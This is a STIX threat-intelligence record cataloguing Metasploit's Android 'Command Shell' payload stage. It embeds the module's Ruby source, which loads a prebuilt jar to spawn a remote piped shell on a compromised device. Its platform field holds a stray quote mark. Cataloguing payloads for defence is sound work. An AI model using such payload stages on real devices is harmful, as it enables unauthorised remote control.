{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ed1e29ee-937b-4ca3-95d0-2c9a4d9100d0",
    "created": "2024-08-14T16:33:19.252189Z",
    "modified": "2024-08-14T16:33:19.252193Z",
    "name": "Command Shell",
    "description": "Spawn a piped command shell (sh)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stages/android/shell.rb",
            "external_id": "shell.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nmodule MetasploitModule\n\n  # The stager should have already included this\n  #include Msf::Payload::Java\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t\t=> 'Command Shell',\n      'Description'\t=> 'Spawn a piped command shell (sh)',\n      'Author'\t\t=> [\n          'mihi', # all the hard work\n          'egypt' # msf integration\n        ],\n      'Platform'\t\t=> 'android',\n      'Arch'\t\t\t=> ARCH_DALVIK,\n      'License'\t\t=> MSF_LICENSE,\n      'Session'\t\t=> Msf::Sessions::CommandShell))\n  end\n\n  #\n  # Override the {Payload::Android} version so we can load a prebuilt jar\n  # to be used as the final stage\n  #\n  def generate_stage(opts={})\n    clazz = 'androidpayload.stage.Shell'\n    shell_jar = MetasploitPayloads.read(\"android\", \"shell.jar\")\n\n    # Name of the class to load from the stage, and then the actual jar\n    # to load it from\n    java_string(clazz) + java_string(shell_jar)\n  end\nend\n",
    "x_mitre_platforms": [
        "android'"
    ]
}